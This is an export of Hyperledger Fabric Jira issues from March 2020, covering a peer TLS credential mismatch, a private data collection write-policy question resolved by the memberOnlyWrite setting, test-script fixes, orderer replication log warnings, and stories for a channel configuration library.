package ID 'chaincode:786d2eda61346963c45cea62a9d3dd36b054741d51e45ef3b07f769e00acbb20', on channel 'testchannel' with definition {sequence: 1, endorsement info: (version: '1.0', plugin: 'escc', init required: true), validation info: (plugin: 'vscc', policy: '0a17120812060801120208001a0b12090a074f7267314d5350'), collections: ()} ^[[34m2020-03-16 10:25:19.287 UTC [endorser] callChaincode -> INFO 07e^[[0m finished chaincode: _lifecycle duration: 1ms channel=testchannel txID=3381d125 ^[[34m2020-03-16 10:25:19.625 UTC [comm.grpc.server] 1 -> INFO 07f^[[0m unary call completed grpc.service=protos.Endorser grpc.method=ProcessProposal grpc.peer_address=127.0.0.1:59888 grpc.peer_subject=""CN=peer,OU=peer+OU=org1,O=BIETC,ST=North Carolina,C=US"" grpc.code=OK grpc.call_duration=340.668187ms 
^[[33m2020-03-16 10:25:50.062 UTC [peer.blocksprovider] func1 -> WARN 080^[[0m Encountered an error reading
from deliver stream: EOF channel=testchannel orderer-address=test-machine-orderer:7050 
^[[33m2020-03-16 10:25:50.062 UTC [peer.blocksprovider] DeliverBlocks -> WARN 081^[[0m Got error while attempting to receive blocks: received
bad status FORBIDDEN from orderer channel=testchannel orderer-address=test-machine-orderer:7050

*Following are the environment variables set at the peer:*
export CORE_PEER_ID=peer0.org1
export CORE_PEER_ADDRESS=test-machine:7051
export CORE_PEER_LISTENADDRESS=test-machine:7051
export CORE_PEER_GOSSIP_EXTERNALENDPOINT=test-machine:7051
export CORE_PEER_CHAINCODEADDRESS=test-machine:7052
export CORE_PEER_CHAINCODELISTENADDRESS=test-machine:7052
export CORE_PEER_ENDORSER_ENABLED=true
export CORE_PEER_LOCALMSPID=Org1MSP
#export CORE_LEDGER_STATE_STATEDATABASE=CouchDB
#export CORE_LEDGER_STATE_COUCHDBCONFIG_COUCHDBADDRESS=127.0.0.1:5984
export CORE_CHAINCODE_BUILDER=hyperledger/fabric-ccenv:amd64-2.0.0
export CORE_CHAINCODE_GOLANG=hyperledger/fabric-baseos:amd64-2.0.0
export CORE_PEER_MSPCONFIGPATH=/var/hyperledger/peer/msp
export CORE_CHAINCODE_EXECUTETIMEOUT=300s
export CORE_PEER_TLS_ENABLED=true
export CORE_PEER_TLS_KEY_FILE=/var/hyperledger/peer/msp/keystore/d430515c3e1975b6578e3a0eefe50eba11d7bc4ecb9c855b442d538a7b00e49b_sk
export CORE_PEER_TLS_CERT_FILE=/var/hyperledger/peer/msp/signcerts/cert.pem
export CORE_PEER_TLS_ROOTCERT_FILE=/var/hyperledger/peer/msp/tlscacerts/tls-test-machine-7054.pem
export CORE_PEER_TLS_CLIENTAUTHREQUIRED=true
export CORE_PEER_TLS_CLIENTCERT_FILE=/var/hyperledger/peer/msp/signcerts/cert.pem
export CORE_PEER_TLS_CLIENTKEY_FILE=/var/hyperledger/peer/msp/keystore/d430515c3e1975b6578e3a0eefe50eba11d7bc4ecb9c855b442d538a7b00e49b_sk
export CORE_PEER_TLS_CLIENTROOTCAS_FILES=/var/hyperledger/peer/msp/tlscacerts/tls-test-machine-7054.pem
export FABRIC_LOGGING_SPEC=INFO
export FABRIC_CFG_PATH=/opt/gopath/src/github.com/hyperledger/fabric/sampleconfig


",,denyeart,jarvis26,nitishbhardwaj19,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i01a0r:",,,,Unset,Unset,,,,Unset,,,,,,Unset,,Unset,,(Please add usage information),denyeart,jarvis26,nitishbhardwaj19,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"19/Mar/20 1:00 PM;denyeart;These errors indicate that your peer credentials do not match the credentials expected in the channel configuration, and is typically seen when the channel config and peers are using a mix of older credentials and newer credentials from different trial attempts. I'd suggest start with a known working sample such as test network to understand how the credentials come together:
https://hyperledger-fabric.readthedocs.io/en/master/test_network.html

Since there is no evidence of a bug per se, let's close the bug issue.
For configuration issues such as these, Rocket.Chat, Stackoverflow, and Fabric mailing list are your best bets for finding help.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Un-authorized org member saving private data gets succeed,FAB-17626,44587,,Bug,Closed,FAB,Fabric,software,denyeart,,,High,Invalid: Works as Expected,,TomXu,TomXu,16/Mar/20 10:50 PM,19/Mar/20 9:53 AM,28/Oct/23 3:09 AM,19/Mar/20 7:15 AM,v2.0.0,,,,,,,,,,,,,fabric-peer,,,,,,,,,0,,,,,,"The un-authorized org member 'User1@org2.example.com' putting private data got succeed but the collections_config.json policy is ""policy"": ""OR('Org1MSP.member')"".
While this member read private data got failed.
 
Expected:
The un-authorized org member should not be permitted to put private data.",,denyeart,TomXu,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,0432c3e80,Unset,No,,,"1|i01a17:",,,,Unset,Unset,,"1. In fabric 2.0, start test-network by default.

2. Set collections_config.json as below:
////////////////////////////////////////////
[
{
""name"": ""leaseRecords"",
""policy"": ""OR('Org1MSP.member')"",
""requiredPeerCount"": 2,
""maxPeerCount"": 4,
""blockToLive"": 0,
""memberOnlyRead"": true
}
]
/////////////////////////////////////////////

3. Commit a chaincode (Go) likes below (just PutPrivateData):
/////////////////////////////////////////////
err = stub.PutPrivateData(PRIVATE_COLLECTION_LEASE, ""PRV_""+l.Id, jByte)
/////////////////////////////////////////////

3. Switch to User1@org2.example.com identity,  run `peer chaincode invoke` to add private data
# peer chaincode invoke ...

User1@org2.example.com putting private got succeed, no error. (The private was surely put into the private data)

4. Still be User1@org2.example.com, try to query the private data, an error was thrown likes: tx creator does not have read access permission on privatedata in chaincodeName:vehiclesharing collectionName: leaseRecords.",,Unset,,,,,,Unset,,Unset,,(Please add usage information),denyeart,TomXu,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"19/Mar/20 7:15 AM;denyeart;If you don't want clients from other orgs to write the private data, on the collection configuration set memberOnlyWrite to true.
For more details see https://hyperledger-fabric.readthedocs.io/en/latest/private-data-arch.html;;;","19/Mar/20 9:53 AM;TomXu;Thank you [~denyeart].

So sorry that I omitted this new property in Fabric 2.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Fix example usage output in update test,FAB-17627,44589,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Invalid: Works as Expected,,caod,caod,17/Mar/20 12:13 AM,17/Mar/20 10:25 PM,28/Oct/23 3:09 AM,17/Mar/20 10:25 PM,,,,,,,,,,v2.1.0,,,,fabric-common,,,,,,,,,0,ipm,,,,,"There's a couple fields missing in the example usage output, let's regenerate the expected config update ",,caod,tsharris,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,FAB-17628,,,No,,Unset,No,,,"1|i00n2e:8znqzzyhf",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),caod,tsharris,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"17/Mar/20 10:25 PM;tsharris;The example test currently works as is. ;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Config Transaction Library,FAB-17628,44591,,Epic,Closed,FAB,Fabric,software,denyeart,,,High,Done,caod,caod,caod,17/Mar/20 4:12 AM,04/Dec/20 4:07 AM,28/Oct/23 3:09 AM,03/Dec/20 6:47 AM,v2.1.0,v2.2.0,,,,,,,,v2.1.0,v2.x,,,fabric-common,,,,,,,,,0,,,,,,"The goal of this track of work is to produce a consumable API/library that can be imported and used for modifying existing config transactions and generating a config update. An example use case could be a consumer building a CLI for translating desired config parameter updates passed via flags to the imported library, something along the lines of {{configtx update current_config.pb --addAnchorPeer host1:123 --org Org1}} which could pass the desired anchor peer down to the config library's AddAnchorPeer function to add the new anchor peer and then call ComputeConfigUpdate to generate the config update envelope returned via the CLI.

Currently users need to follow steps similar to those found in [https://hyperledger-fabric.readthedocs.io/en/release-2.0/config_update.html#editing-a-config] which largely revolves around having the user decode the channel transaction to JSON and then manually updating properties prior to re-encoding and then submitting the update. This library is intended to be lightweight and only use minimal dependencies.",,caod,denyeart,dereckluo,nao,robmurgai,ymlbright,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Completed.,"The config package will contain API functions for modifying/adding/removing specific components in the config. For example when passed an existing config transaction of type common.Config (https://github.com/hyperledger/fabric-protos-go/blob/master/common/configtx.pb.go#L92-L98) the library will support functions for adding and removing anchor peers to specific application orgs, updating orderer consensus type and batch parameters, adding or removing policies for config groups, etc. Full supported features will be added to the documentation and examples.

Currently the scope will at first encapsulate creating and updating application channels, but will eventually support system channel operations as well.",Unset,Unset,Unset,ghx-label-1,,Config Transaction Library,To Do,No,,Unset,No,,,"1|i01a1n:",,,,No,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,https://godoc.org/github.com/hyperledger/fabric-config/configtx#pkg-examples,caod,denyeart,dereckluo,nao,robmurgai,ymlbright,,,,,,,,,AA,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"21/Mar/20 1:21 AM;caod;RFC proposal: [https://github.com/hyperledger/fabric-rfcs/pull/25];;;","05/Aug/20 8:44 PM;denyeart;Library for config updates available in [https://github.com/hyperledger/fabric-config];;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
run-integration-tests.sh traverses hidden directories and does not run all integration tests,FAB-17629,44592,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,,sykesm,sykesm,17/Mar/20 4:38 AM,18/Mar/20 11:58 PM,28/Oct/23 3:09 AM,18/Mar/20 11:58 PM,v2.1.0,,,,,,,,,,,,,fabric-build,,,,,,,,,0,,,,,,"When running a local build:
{code}
grep: ./.build/docker/gotools/obj/src/github.com/golang/dep/internal/fs/testdata/symlinks/invalid-symlink: No such file or directory
grep: ./.build/docker/gotools/obj/src/github.com/golang/dep/internal/fs/testdata/symlinks/windows-file-symlink: No such file or directory
{code}

This implies that the script is traversing hidden directories and the build directory.

The script is also looking explicitly for integration test packages that include {{RunSpecs}} in them. This implies we're looking for ginkgo tests. While ginkgo tests are the majority, they are not the only integration tests. (e.g. common/tools/protolator/integration/integration_test.go) The implication is that there are integration tests excluded by the unit test script that do not execute in the integration test phase.

- The script should not examine hidden directories or the build directory
- The script should be looking for integration test packages, not RunSpecs

/cc [~btl5037]",,btl5037,sykesm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i01a1v:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),btl5037,sykesm,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"17/Mar/20 6:48 AM;btl5037;Thanks Matt, I'll take a look at this;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
run-unit-tests.sh should not excluded vendored dependencies for conditional packages,FAB-17630,44593,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,sykesm,sykesm,sykesm,17/Mar/20 5:15 AM,17/Mar/20 9:16 PM,28/Oct/23 3:09 AM,17/Mar/20 9:16 PM,,,,,,,,,,v2.1.0,,,,fabric-build,,,,,,,,,0,,,,,,"I noticed that the gossip tests were not running when vendored packages used by gossip were updated. Looking at the script, we were explicitly ignoring vendored deps and this is wrong.",,sykesm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i01a23:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),sykesm,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"17/Mar/20 5:24 AM;sykesm;https://github.com/hyperledger/fabric/pull/866;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
replicateDisabledChains should not pull from own endpoint,FAB-17631,44594,,Bug,Unverified,FAB,Fabric,software,denyeart,,,Low,,,barney2k7,barney2k7,17/Mar/20 6:43 PM,17/Apr/21 4:23 AM,28/Oct/23 3:09 AM,,v1.4.4,,,,,,,,,,,,,fabric-orderer,,,,,,,,,0,help-wanted,,,,,"When an orderer service node is removed from an application channel, it frequently (every 5 minutes by default it seems) tries to replicate disabled chains from all endpoints, including from itself.

Trying to pull from its own endpoint causes WARN in the logs, because block height is always lower than on other nodes:
{code:java}
2020-03-16 15:13:37.238 UTC [orderer.common.cluster.replication] func1 -> WARN b8f91 Received error of type 'minimum requested sequence is 74 but orderer3-orderer-org-1:7050 is at sequence 6' from {orderer3-orderer-org-1:7050 [-----BEGIN CERTIFICATE-----
(12 lines of cert content removed)
-----END CERTIFICATE-----
]}
{code}
(this log message is from orderer3-orderer-org-1:7050 itself)

A full log of a replicateDisabledChains-cycle is attached (with the warning above appearing on line 16)

I assume trying to pull a disabled chain from its own endpoint is never useful. At least no warnings should be logged in this scenario.",,barney2k7,denyeart,jyellick,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"17/Mar/20 6:43 PM;barney2k7;replicateDisabledChains.log;https://jira.hyperledger.org/secure/attachment/18174/replicateDisabledChains.log",,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i01a2b:",,,,Unset,Unset,,"1.) create an application channel
2.) remove one orderer service node from it using a channel config update
3.) observe: unnecessary warnings in the log, as listed above",,Unset,,,,,,Unset,,Unset,,(Please add usage information),barney2k7,denyeart,jyellick,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"19/Mar/20 1:33 PM;denyeart;[~jyellick] [~guoger] What is your opinion?;;;","17/Apr/21 4:22 AM;jyellick;Seems like a bug and one we should fix.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Exclude unnecessary code from ecdsa.go [fabric-sdk-go],FAB-17632,44596,,Task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,VadimInshakov,VadimInshakov,VadimInshakov,17/Mar/20 10:46 PM,24/Mar/20 5:56 PM,28/Oct/23 3:09 AM,24/Mar/20 5:56 PM,,,,,,,,,,,,,,fabric-sdk-go,,,,,,,,,0,,,,,,"We have some unnecessary operations in GenSKI method: return *ski* variable that always *nil* and dummy hash concatenation with *nil* bytes. I think it needs to be removed to keep the code clean.
 ",,VadimInshakov,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i01a2j:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),VadimInshakov,,,,,,,,,,,,,,dependabot/go_modules/golang.org/x/crypto-0.1.0,dependabot/go_modules/test/performance/golang.org/x/net-0.7.0,dependabot/go_modules/golang.org/x/net-0.7.0,main,dependabot/go_modules/github.com/prometheus/client_golang-1.11.1,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"17/Mar/20 11:04 PM;VadimInshakov;[https://github.com/hyperledger/fabric-sdk-go/pull/60];;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Document Tests in a README,FAB-17633,44597,,Task,Closed,FAB,Fabric,software,denyeart,,,Medium,Duplicate,,btl5037,btl5037,17/Mar/20 11:51 PM,11/Jan/21 3:06 AM,28/Oct/23 3:09 AM,11/Jan/21 3:06 AM,,,,,,,,,,v2.x,,,,fabric-quality,,,,,,,,,0,,,,,,"In `./tools/PTE/CITests` we have a README that lists our test tasks. After speaking with Rob, we should replicate this in the root of `./system_test (./regression)` and it should include a list of each of our tests, a very, very brief description of the test and a link to the README for each of our tests.

With that being said, each test should also include a README describing the test scenario and the topology of the test network.

This will help developers identify tests they want to target when they want to test something related to changes they've made.

All future tests will need to include an update to the global README and the README specific to the scenario",,btl5037,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i0192i:r9",,,,Unset,Unset,To Do,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),btl5037,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Standardize Logging Format in Operator,FAB-17634,44598,45248,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Won't Do,btl5037,btl5037,btl5037,17/Mar/20 11:53 PM,11/Jan/21 2:38 AM,28/Oct/23 3:09 AM,11/Jan/21 2:38 AM,,,,,,,,,,v2.x,,,,fabric-quality,,,,,,,,,0,,,,,,"We need to standardize on a format and implement in both PTE and Operator. We should consider the format Matt recommended in his meeting.

We should have a flag that switches between human readable for logging when running locally and JSON based for logging in Kube with LogDNA ingestion",,btl5037,Matrixik,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i00uze:rzczqzxyzzx8zwz2",,,,Unset,Unset,In Progress,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),btl5037,Matrixik,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Fix incorrect word in comment,FAB-17635,44599,,Documentation,Closed,FAB,Fabric,software,denyeart,,,Low,Done,Eggsy,Eggsy,Eggsy,18/Mar/20 6:45 PM,19/Apr/20 12:37 PM,28/Oct/23 3:09 AM,19/Apr/20 12:37 PM,,,,,,,,,,,,,,,,,,,,,,,0,,,,,,"[Fix incorrect word in comment|https://github.com/hyperledger/fabric/commit/a30cb2462b0a82728d339714133c67f157296417]",,denyeart,Eggsy,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i01a2r:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),denyeart,Eggsy,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"19/Apr/20 12:37 PM;denyeart;https://github.com/hyperledger/fabric/pull/877;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Implement helper function for retrieving capabilities from an existing config,FAB-17636,44600,,Story,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,caod,caod,caod,19/Mar/20 1:02 AM,25/Mar/20 4:49 AM,28/Oct/23 3:09 AM,25/Mar/20 4:49 AM,,,,,,,,,,v2.1.0,,,,fabric-common,,,,,,,,,0,ipm,,,,,"As a user of the Fabric channel configuration API, I would like to be able to retrieve existing orderer, application, and channel capabilities from a config transaction.

 

*Acceptance*

I should be able to call a function for retrieving orderer, application, and channel capabilities that returns a config.Capabilties.",,caod,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-17568,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,FAB-17628,,,No,,Unset,No,,,"1|i00n2e:8znqzzygs",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),caod,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"21/Mar/20 12:15 AM;caod;https://github.com/hyperledger/fabric/pull/893;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Implement functions for adding and removing capabilities from a config,FAB-17637,44601,,Story,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,tsharris,caod,caod,19/Mar/20 1:14 AM,30/Mar/20 9:40 PM,28/Oct/23 3:09 AM,30/Mar/20 9:40 PM,,,,,,,,,,v2.1.0,,,,fabric-common,,,,,,,,,0,ipm,,,,,"As a user of the Fabric channel configuration API, I would like to be able to add and remove application, orderer, and channel capabilities. Consider whether we should allow setting unsupported capabilities outside of the existing ones or if we should just have toggles (ie EnableV20ApplicationCapabilities() and Disable...)

 

*Acceptance*

I should be able to call these functions to modify a config transaction and then process further configuration updates on the modified config transaction. The examples test should be updated to demonstrate usage of this feature.

 ",,caod,tsharris,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,FAB-17628,,,No,,Unset,No,,,"1|i00n2e:8znqzzzjs",,,,Unset,Unset,,(Please add steps to reproduce),1.0,Unset,,,,,,Unset,,Unset,,(Please add usage information),caod,tsharris,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"27/Mar/20 10:23 PM;tsharris;[https://github.com/hyperledger/fabric/pull/923];;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Implement helper function for retrieving application configuration from an existing config,FAB-17638,44602,,Story,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,xwu,caod,caod,19/Mar/20 1:16 AM,30/Mar/20 11:29 PM,28/Oct/23 3:09 AM,30/Mar/20 11:29 PM,,,,,,,,,,v2.1.0,,,,fabric-common,,,,,,,,,0,ipm,,,,,"As a user of the Fabric channel configuration API, I would like to be able to retrieve existing application configuration without manually parsing the config transaction.

 

*Acceptance*

I should be able to call a function for retrieving application configuration that returns a config.Application.",,caod,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-17660,,FAB-17568,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,FAB-17628,,,No,,Unset,No,,,"1|i00n2e:8znqzzzjw",,,,Unset,Unset,,(Please add steps to reproduce),1.0,Unset,,,,,,Unset,,Unset,,(Please add usage information),caod,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"26/Mar/20 11:55 PM;caod;[https://github.com/hyperledger/fabric/pull/914];;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Implement functions for adding and removing ACLs from an application group,FAB-17639,44603,,Story,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,dereckluo,caod,caod,19/Mar/20 1:20 AM,27/Mar/20 11:39 PM,28/Oct/23 3:09 AM,27/Mar/20 11:39 PM,,,,,,,,,,v2.1.0,,,,fabric-common,,,,,,,,,0,ipm,,,,,"As a user of the Fabric channel configuration API, I would like to be able to update an application groups's ACLS by adding or removing ACLs.

 

*Acceptance*

I should be able to call this function to modify a config transaction and then process further configuration updates on the modified config transaction. The examples test should be updated to demonstrate usage of this feature.

 ",,caod,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,FAB-17628,,,No,,Unset,No,,,"1|i00n2e:8znqzzzju",,,,Unset,Unset,,(Please add steps to reproduce),1.0,Unset,,,,,,Unset,,Unset,,(Please add usage information),caod,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Move config package out from Fabric,FAB-17640,44604,,Story,Closed,FAB,Fabric,software,denyeart,,,Highest,Done,caod,caod,caod,19/Mar/20 4:00 AM,09/May/20 9:10 PM,28/Oct/23 3:09 AM,06/May/20 9:45 PM,,,,,,,,,,,,,,,,,,,,,,,0,ipm,,,,,"We want to remove the config package from Fabric before the release-2.1 branch is cut so it doesn't go into v2.1.0. This may involve a formal RFC justifying the creation (can probably just refer to information in FAB-17628) so the linux foundation can approve and create a new repo for us.

 

*Acceptance*

A new repo created in the hyperledger org that contains renamed packages for the config code. Contributing guide, CI process/configuration, integration tests exist for the new repo.",,caod,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,FAB-17628,,,No,,Unset,No,,,"1|i00n2e:8znqzzzzzi",,,,Unset,Unset,,(Please add steps to reproduce),3.0,Unset,,,,,,Unset,,Unset,,(Please add usage information),caod,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,release-2.1,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"19/Mar/20 4:01 AM;caod;Note: this will also loosen the requirements around getting code merged since we won't be pushing to Fabric afterwards.;;;","19/Mar/20 4:15 AM;caod;/cc [~denyeart];;;","21/Mar/20 1:21 AM;caod;RFC Proposal: [https://github.com/hyperledger/fabric-rfcs/pull/25];;;","23/Mar/20 11:23 PM;caod;Consider go mod implications and versioning. Do not call it version 1 (otherwise can't change) since we aren't done yet.;;;","14/Apr/20 4:09 AM;caod;Initial work in [https://github.com/caod123/fabric-config];;;","23/Apr/20 7:23 AM;caod;For now this story will just encompass moving the pkg/configtx code out to a fabric-config repo. Followup nuances will be addressed in a future epic for cleaning up fabric integration tests to use the new library and ripping out configtxgen related code in favor of consuming the new package.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
